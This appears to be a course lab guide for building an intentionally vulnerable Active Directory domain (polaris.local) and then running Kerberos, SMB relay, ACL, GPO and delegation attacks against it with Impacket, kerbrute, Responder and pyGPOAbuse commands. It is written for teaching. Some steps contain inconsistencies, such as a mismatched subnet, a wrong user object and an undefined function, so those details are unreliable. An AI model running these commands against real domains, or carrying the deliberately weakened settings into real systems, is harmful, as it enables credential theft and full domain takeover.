# Windows Lab

## Appliances
- DC (Windows Server 2022)
- DM (Windows Server 2022)
- Attacker (Ubuntu 22.04)
- NAT
- Switch

After connecting the appliances you  are ready to start the lab configurations.

## DC

### Configure the IP addresses and domain name
Before configuring the IP addresses, you must learn what is the subnet where the NAT cloud is operating. One way of learning is to start the attacker and check the IP address, subnet mask, and gateway it gets from the NAT DHCP server (e.g., using ip add and ip route). In our case, the subnet is 198.168.122.0/24, and the gateway is 198.168.122.1. Then, the following actions must be performed:
1. *Under Server Manager* → *Local Server* → *Properties* click on the *Ethernet link*, then on the Ethernet adapter, and finally click *Properties* → *IPv4*.
2. At this window enter IP address as **192.168.122.10**, subnet mask as **255.255.255.0**, default gateway as **192.168.122.1**, and DNS servers as **192.168.122.10** and **8.8.8.8**.
3. Click *Advanced*, select the *DNS* tab, and in the box *DNS suffix* for this connection write polaris.local.
4. Apply all the changes and return to the Server Manager window.

### Rename the Server
Change the name of the server to DC1. This can be done in the Control Panel under System. Restart the computer to apply the changes.

**OR**

1. Open Powershell and write: 
```bash
rename-computer -newname "DC1"
```

2. Restart the computer to apply the changes

### Adjust the clock
Make sure that the time zone, the date, and the time are correctly set. The time zone must be set to UTC. The date and time must be close to the attacker’s one. The easiest way is to make the adjustments in the *Control Panel*.

### Install the Active Directory

1. In the *Server Manager*, click *Manage* → *Add Roles and features then click *Next* until reaching the *Server Roles* tab.
2. Check the *Active Directory Domain Services* box, click *Add features* and click *Next* until the Confirmation tab appears. At this tab click *Install*.
3. After the installation, click *Promote this server to a domain controller*.
4. Select Add a new forest and write **polaris.local** in the Root Domain name box. Then click *Next*.
5. Enter the password for the DSRM administrator account. Then click *Next* until the *Prerequisites* tab appears and click on Install.

### Configure DNS
1. Go back to the IP address configuration window and reconfigure the DNS servers as **192.168.122.10** and **8.8.8.8**. Apply the changes and return to the Server Manager window.
2. Click *Tools* → *DNS* → *DC1*.
3. Right-click on *Reverse Lookup Zones*, then click *New Zone* → *Next* → *Primary zone* → *Nex*t and select *To all DNS servers running... in this forest: polaris.local*.
4. Click *Next* → *IPv4 Reverse Lookup Zone* → *Next*. In NetworkID box enter **192.168.122**. Then click *Next* → *Next* → *Finish*. A new entry should have appeared in the *Reverse Lookup Zones* tab.

### Configure Users
To configure one user, in the Server Manager click *Tools* → *Active Directory Users and Computers* → *Action* → *New* → *User*. Then, enter the user credentials. Uncheck the option *User must change password at next logon*. You must create four users with different characteristics, as indicated in Table 1.


1. User **jesse.pinkman** must be configured with the pre-authentication disabled. To do that access the user *Properties* (e.g., double-click over the username in the *Active Directory Users and Computers* window) and in the Account tab → Account options box check *Do not require Kerberos preauthentication*.
2. User **saul.goodman** must be configured with a password in the description. In the *General* tab → *Description* box write **DELETE THIS LATER. Password: beTTer@caLL@me**.
3. The account of **walter.white** must have an associated SPN. To perform this configuration, click *Tools* → *ADSI Edit* → *Action* → *Connect*. Then in *DC=polaris,DC=local → CN=Users* search for *CN=darlene alderson*. Right-click on this *CN*, select *Properties* and in the *Attribute Editor* tab search for *servicePrincipalName*. Select the attribute, click *Edit* and insert **http/polaris.local:80** in the *Value* to add box. 
Also, add a constrained Delegation through the *Active Directory Users and Computers* tab for the cifs service.
4. Add two more regular users (**skyler.white** and **hank.schrader**) with no vulnerabilities configured.

### Disable SMB Signing
(Only required for the SMB relay attack) 

To disable the SMB signing you will have to change the Registry. In the *Server Manager*, click on *Tools* → *Registry Edito*r and set to *0* the following attributes: 

• RequireSecuritySignature in `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManWorkstation\Parameters`

• EnableSecuritySignature in `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManWorkstation\Parameters`

• RequireSecuritySignature in `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters`

• EnableSecuritySignature in `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters`

**OR**

Open PowerShell as administrator and execute the following lines:

```bash
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" RequireSecuritySignature 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" RequireSecuritySignature 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" EnableSecuritySignature 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" EnableSecuritySignature 0
```

## Domain Member
1. The IP addresses and the domain name are obtained through the DHCP server that is running on the DC. Since there is a second DHCP server on the network (the one of the NAT interface) you may need to force this, e.g., by introducing a delay in the link between the switch and the NAT interface.
2. Now, change the name of the computer and make it join the domain. In the *Control Panel* choose *System and Security*, then *System*, and under *Related Settings* click *Rename this PC (advanced)*. In the Computer Name tab write *DM1* in the Computer description box, then click *Change*, and in the *Member of Domain* box write **polaris.local**. After the configuration, check that a Computers object has been created at the DC. To do that, on the Server Manager navigate to Tools → Active Directory Users and Computers → Computers.
3. Make sure that the DM time zone is UTC, and that its clock is synchronised with the one of the DC. In the *Date and time* settings check that the time server is **DC1.polaris.local**.

## Attacker

### IP Addresses
1. The IP addresses can be configured using netplan. Access the file **50-cloud-init.yaml** using nano `/etc/netplan/50-cloud-init.yaml`. Write this configuration (instead of the one that is already there):

```bash
network:
  version: 2
  renderer: networkd
  ethernets:
    ens3:
      addresses: [192.168.122.15/24]
      routes:
        - to: 0.0.0.0/0
          via: 192.168.122.1
     nameservers:
       search: [polaris.local]
       addresses: [192.168.122.10,8.8.8.8]
```

2. Then run netplan apply.

### Tools Installation
#### Kerbrute
```bash
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
mv kerbrute_linux_amd64 kerbrute
chmod +x kerbrute
```

#### Hashcat
```bash
apt update
apt install hashcat
```

#### Impacket
```bash
apt update
apt install pipx
pipx ensurepath
python3 -m pipx install impacket
reboot
```
#### LDAP Utilities
```bash
apt update
apt install ldap-utils
Responder
git clone https://github.com/lgandx/Responder.git
cd Responder
pip install -r requirements.txt
```

### Attacks

#### User Enumeration
```bash
./kerbrute userenum -d polaris.local users.txt --dc 192.168.122.10
```

#### Password Spraying
```bash
./kerbrute passwordspray -d polaris.local valid_users.txt --dc 192.168.122.10 Password123
```

#### LDAP Queries
1. Query to obtain information on all users:
```bash
ldapsearch -H ldap://192.168.122.10 -D 'jesse.pinkman@polaris.local' -w Wang0Tang0! -b 'DC=polaris,DC=local' '(&(objectCategory=person)(objectClass=user))'
```

2. Query list all asrep-roastable users:
```bash
ldapsearch -H ldap://192.168.122.10 -D 'jesse.pinkman@polaris.local' -w Wang0Tang0! -b 'DC=polaris,DC=local' '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
```

3. Query to list all kerberoastable users:
```bash
ldapsearch -H ldap://192.168.122.10 -D 'jesse.pinkman@polaris.local' -w Wang0Tang0! -b
'DC=polaris,DC=local'
'(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1
.2.840.113556.1.4.803:=2)))'
```

#### AS-REP Roasting
1. Obtain the content of AS-REP message encrypted with the user  of password hash of users with no pre-authentication
```bash
GetNPUsers.py polaris.local/ -no-pass -usersfile valid_users.txt -format hashcat -outputfile hashes.asreproast
```
2. Try to decrypt the encrypted content:
```bash
hashcat -m 18200 hashes.asreproast passwords.txt -o cracked1.txt --force --quiet
```

#### Kerberoasting
1. Obtain a TGS for a service.
```bash
GetUserSPNs.py -request polaris.local/jesse.pinkman:Wang0Tang0! -outputfile kerberoasting.hashes
```

2. Try to decrypt the encrypted content.
```bash
hashcat -m 13100 kerberoasting.hashes passwords.txt -o cracked2.txt --force --quiet
```


#### Golden Ticket
Before performing the attack, deactivate Windows Defender. To access its configuration, on the *Server Manager* go to *Local Server* and click on the *Windows Defender Antivirus* link.

1. Get the krbtgt’s password hash:
```bash
 secretsdump.py polaris.local/administrator:"Passw0rd"@192.168.122.10 | grep krbtgt
```

2. Get the domain SID: 
```bash
lookupsid.py polaris.local/administrator:"Passw0rd"@192.168.122.10
```
3. Create a forged ticket for a user that existss in the Domain: 
```bash
ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_SID> -domain polaris.local -user-id <rid> <username>
```

Check that a file named `admin.ccache` was created. This is the file that stores the TGT.

4. Export the ticket path to the KRB5CCNAME environment variable: 
```bash
export KRB5CCNAME=<username>.ccache
```

5. Get a shell on the DC of the domain: 
```bash
psexec.py polaris.local/<username>@dc1.polaris.local -k -no-pass
```

**[NOTE:]** Add dc1.polaris.local in `/etc/hosts`.


#### SMB Relay
1. At the **attacker**, disable SMB and HTTP responses since these will be handled by **ntlmrelayx.py*. Enter `nano ~/Responder/Responder.conf` and modify the following entries:
```bash
SMB = Off
HTTP = Off
```

2. At the **attacker**, run the following command to prepare the attacker for relaying messages to the DC:
```bash
ntlmrelayx.py -smb2support -t 192.168.122.10 -i
```

3. At the second attacker, first SSH into the attacker using ssh ubuntu@<ip_attacker>. Then launch the Responder in background using:
```bash
./Responder.py -I ens3 -v &
```

4. At DM1, access a non-existing resource such as **\\test** using the **File Explorer**. Now, at both the attackers you should see several messages indicating the success of the attack.
5. Moreover, **ntlmrelayx.py** started an interactive SMB client, typically on 127.0.0.1:11000 (check the address and port number on the output of **ntlmrelayx.py**). Open a reverse shell to this client using `netcat`. The command is:
```bash
nc 127.0.0.1 11000
```

Now you have access to the SMB server. Press ? to see the available options. For instance, shares gives you the list of available shares.


#### ACL
Go to the *ADSI Edit* window. Go to the chosen object to add specific permissions for a given object. In my case, I chose **AdminSDHolder** and **tyrell.wellick**. Go to *Properties* -> *Security* and add an Access Control Entry:

**ForceChangePassword** - check the 'Reset Password' (from user elliot.alderson to user tyrell.wellick)
**GenericAll** - Check every box, so that tyrell.wellick has full control over AdminSDHolder.

**OR**

Apply the following commands in a powershell terminal.

```bash
# https://github.com/davidprowe/BadBlood/blob/master/AD_OU_SetACL/Full%20Control%20Permissions.ps1
Import-Module ActiveDirectory
Set-Location AD:

###########################################################################################################
# SetAcl  $for ---- $right ----> $to
###########################################################################################################
Function SetAcl($for, $to, $right, $inheritance)
{
    $forSID = New-Object System.Security.Principal.SecurityIdentifier (Get-ADUser $for).SID
    $objOU = ($to).DistinguishedName
    $objAcl = get-acl $objOU
    # https://docs.microsoft.com/fr-fr/dotnet/api/system.directoryservices.activedirectoryrights?view=dotnet-plat-ext-5.0
    $adRight =  [System.DirectoryServices.ActiveDirectoryRights] $right # https://docs.microsoft.com/fr-fr/dotnet/api/system.directoryservices.activedirectoryrights?view=dotnet-plat-ext-5.0
    $type =  [System.Security.AccessControl.AccessControlType] "Allow" # https://docs.microsoft.com/fr-fr/dotnet/api/system.security.accesscontrol.accesscontroltype?view=dotnet-plat-ext-5.0
    $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] $inheritance # https://docs.microsoft.com/fr-fr/dotnet/api/system.directoryservices.activedirectorysecurityinheritance?view=dotnet-plat-ext-5.0
    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $forSID,$adRight,$type,$inheritanceType
    $objAcl.AddAccessRule($ace)
    Set-Acl -AclObject $objAcl -path $objOU
}
# Add a 'Generic All' ACE to hank.schrader on AdminSDHolder object.
SetAcl (Get-ADUser "hank.schrader") (Get-ADObject 'CN=AdminSDHolder,CN=system,DC=polaris,DC=local') "GenericAll" "None"

# Add a FoceChangePassword (ExtendedRight) ACE to walter.white on hank.schrader
SetAclExtended (Get-ADUser "walter.white") (Get-ADUser "hank.schrader") "ExtendedRight" "00299570-246d-11d0-a768-00aa006e0529" "None"

```


##### Attacker
1. Install the net tool from Samba
```bash
sudo apt-get install samba
```
2. Exploit ACLs
```bash
# Reset hank.schrader password
net rpc password hank.schrader -U polaris.local/walter.white -S 192.168.122.10

# Add walter.white to the Domain Admin group
net rpc group addmem "Domain Admins" "walter.white" -U polaris.local/hank.schrader%sHyangja@10 -S 192.168.122.10
```

#### GPO
1. Open *Group Policy Management*. Create a new Group Policy in *Group Policy Objects*. Link it to the Domain. Edit the Group Policy to do something such as setting the wallpaper.

**OR**

Apply the following configurations in a powershell window.

```bash
New-GPO -Name "Wallpaper Policy" -comment "Change Wallpaper" 
New-GPLink -Name "Wallpaper Policy" -Target "DC=polaris,DC=local"
#https://www.thewindowsclub.com/set-desktop-wallpaper-using-group-policy-and-registry-editor
Set-GPRegistryValue -Name "Wallpaper Policy" -key "HKEY_CURRENT_USER\Control Panel\Colors" -ValueName Background -Type String -Value "100 175 200"
#Set-GPPrefRegistryValue -Name "StarkWallpaper" -Context User -Action Create -Key "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" -ValueName Wallpaper -Type String -Value "C:\tmp\GOAD.png"

Set-GPRegistryValue -Name "Wallpaper Policy" -key "HKEY_CURRENT_USER\Control Panel\Desktop" -ValueName Wallpaper -Type String -Value ""
#Set-GPPrefRegistryValue -Name "StarkWallpaper" -Context User -Action Create -Key "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" -ValueName WallpaperStyle -Type String -Value "4"

Set-GPRegistryValue -Name "Wallpaper Policy" -Key "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\CurrentVersion\WinLogon" -ValueName SyncForegroundPolicy -Type DWORD -Value 1

# Allow hank.schrader to Edit Settings of the GPO
# https://learn.microsoft.com/en-us/powershell/module/grouppolicy/set-gppermission?view=windowsserver2022-ps
Set-GPPermissions -Name "Wallpaper Policy" -PermissionLevel GpoEditDeleteModifySecurity -TargetName "hank.schrader" -TargetType "User"
```

###### Attacker
1. Install pyGPOAbuse to abuse the GPO.
```bash
git clone https://github.com/Hackndo/pyGPOAbuse.git
python3 -m venv gpoenv
source gpoenv/bin/activate
cd pyGPOAbuse
python3 -m pip install -r requirements.txt
```

2. Exploit the GPO.
```bash
python3 pygpoabuse.py polaris.local/hank.schrader:'sHyangja@10' -gpo-id "<gpo-id>"
```
3. Then, we either wait for the policy to be updated and executed or force it using `gpupdate /force` on our DC.

#### Constrained Delegation
1. Find all the constrained delegations.
```bash
findDelegation.py POLARIS.LOCAL/jesse.pinkman:Wang0Tang0! -target-domain polaris.local
```
2. To abuse the constrained delegation with protocol transition, the concept is to first ask a TGT for the user and execute S4U2Self followed by a S4U2Proxy to impersonate an admin user to the SPN on the target.
```bash
getST.py -spn 'CIFS/DC1.polaris.local' -impersonate Administrator -dc-ip '192.168.122.10' 'polaris.local/walter.white:Metho1o590oA$elry'
export KRB5CCNAME=Administrator.ccache
```

3. Obtain a shell whit the ticket received.
```bash
wmiexec.py -k -no-pass polaris.local/administrator@dc1.polaris.local
```






